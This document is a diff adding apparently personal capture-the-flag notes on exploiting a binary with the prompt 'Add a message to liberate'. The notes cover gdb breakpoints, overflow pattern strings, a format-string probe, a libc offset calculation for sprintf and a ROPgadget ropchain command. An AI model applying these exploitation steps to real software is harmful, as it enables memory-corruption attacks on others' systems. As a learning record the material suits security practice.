@@ -1,0 +1,47 @@
+Add a message to liberate:
+buffer: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVAAAABBBBCCCCDDDDEEE
+
+checking buffer, stepping till % found (buff+0x12aa?)
+check if strlen(buffer)< offset % found
+check if no % and dogfoxsunEXG
+
+
+br check
+br *check+117
+
+
+Add a message to liberate: %%%%%p <- sprintf
+
+
+break *main+807
+
+RDX: 0x6b ('k')
+RSI: 0x7ffe2c8dba90 --> 0x2525 ('%%')
+RDI: 0x7ffe2c8dbb00 --> 0x2525 ('%%')
+
+
+  memset(&s, 0, 0x6CuLL);
+  memset(&dest, 0, 0x6CuLL);
+  scanf("%107s", &s)
+  strncpy(&dest, &s, 0x6BuLL);
+  
+  !strncmp(&dest, &s, 0x6BuLL)
+
+
+
+break *main+650
+
+Add a message to liberate: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVAAAABBBBCCCCDDD%%%p <- sprintf
+
+info proc mapping
+0x7f39539fe000     0x7f3953a20000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
+
+disas sprintf
+0x00007f3953a566e0
+
+0x00007f3953a566e0-0x7f39539fe000 = 0x586E0
+
+ROPgadget --ropchain --binary /lib/x86_64-linux-gnu/libc-2.28.so > rop
+
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVAAAABBBBCCCCDDD%%%p
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
